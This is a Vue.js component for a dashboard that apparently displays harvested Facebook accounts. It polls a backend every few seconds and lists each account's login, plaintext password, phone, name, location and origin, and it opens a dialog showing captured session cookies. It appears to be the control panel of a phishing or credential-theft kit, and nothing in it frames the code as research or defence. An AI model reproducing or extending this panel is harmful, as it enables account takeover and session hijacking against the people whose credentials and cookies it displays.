<template>
  <v-card>
    <v-toolbar>
      <v-toolbar-title>Facebook users</v-toolbar-title>
      <v-spacer/>
      <v-radio-group 
        v-model="radioGroup" 
        :column="false">
        <v-radio
          :value="1"
          label="Ordinary accounts"
        />
        <v-radio
          :value="2"
          label="Special accounts"
        />
      </v-radio-group>
      <v-spacer/>
      <v-btn 
        v-if="!interval"
        icon
        @click.stop="setInterval">
        <v-icon>mdi-play</v-icon>
      </v-btn>
    
      <v-btn 
        v-if="interval"
        icon
        @click="clearInterval">
        <v-icon>mdi-pause</v-icon>
      </v-btn>
    </v-toolbar>

    <v-data-table
      :headers="headers"      
      :items="filteredUsers"
      :rows-per-page-items="[20,50,100,{'text':'All','value':-1}]"
      :pagination.sync="pagination">
      <template 
        slot="items"
        slot-scope="props">
        <td>{{ formatDate(props.item.date) }}</td>
        <td>{{ props.item.id }}</td>
        <td>{{ props.item.login }}</td>
        <td>{{ props.item.password }}</td>
        <td>{{ props.item.phone }}</td>
        <td>{{ props.item.name }}</td>
        <td>{{ props.item.origin }}</td>
        <td>{{ props.item.location }}</td>
        <td>
          <v-btn 
            v-if="props.item.cookies"
            icon 
            @click="handleShowCookies(props.item)">
            <v-icon>mdi-circle</v-icon>
          </v-btn>
        </td>
        <td>{{ props.item.alert }}</td>
      </template>
    </v-data-table>

    <v-dialog 
      v-model="cookiesDialog"
      lazy>
      <v-card>
        <v-card-title>
          COOKIES
        </v-card-title>
        <v-card-text>
          {{ cookies }}  
        </v-card-text>
        <v-card-actions>
          <v-btn 
            flat
            @click.stop="cookiesDialog = false">Close
          </v-btn>
        </v-card-actions>
      </v-card>
    </v-dialog>
    
  </v-card>
</template>
<script>
import { DateTime } from 'luxon'

export default {
  name: 'Users',
  data: () => ({
    headers: [
      { text: 'Last update', value: 'date' },
      { text: 'Facebook ID', value: 'id' },
      { text: 'Login', value: 'login' },
      { text: 'Password', value: 'password' },
      { text: 'Phone', value: 'phone' },
      { text: 'Name', value: 'name' },
      { text: 'Origin', value: 'origin' },
      { text: 'Location', value: 'location' },
      { text: 'Cookies', value: 'cookies' },
      { text: 'Alert', value: 'alert' }
    ],
    pagination: { sortBy: 'date', descending: true, rowsPerPage: 20 },
    users: [],
    interval: null,
    cookies: null,
    cookiesDialog: null,
    radioGroup: 1
  }),
  computed: {
    filteredUsers: function(filter) {
      return this.users.filter(user => {
        if (this.radioGroup === 1) return user.id ? true : false
        if (this.radioGroup === 2) return user.id ? false : true
      })
    }
  },
  mounted() {
    this.getUsers()
  },
  methods: {
    getUsers() {
      return axios
        .get('/api/v1/FbUsers', { limit: 500, sort: 'date' })
        .then(res =>
          res.data.sort((a, b) => new Date(b.date) - new Date(a.date))
        )
        .then(data =>
          data.map(user => {
            user.alert = user.alert ? 'yes' : 'no'

            return user
          })
        )
        .then(data => {
          // console.log('Users refreshed')
          this.users = data
        })
        .catch(err => console.log(err))
    },
    setInterval() {
      this.interval = setInterval(() => {
        this.getUsers()
      }, 3000)
    },
    clearInterval() {
      clearInterval(this.interval)
      this.interval = null
    },
    handleShowCookies(item) {
      this.cookiesDialog = true
      this.cookies = item.cookies.map(cookie => {
        for (const key in cookie) {
          if (cookie[key].length > 100)
            cookie[key] = cookie[key].slice(0, 50) + '...'
        }

        return cookie
      })
    },
    formatDate(date) {
      return DateTime.fromISO(date).toFormat('ff')
    }
  }
}
</script>
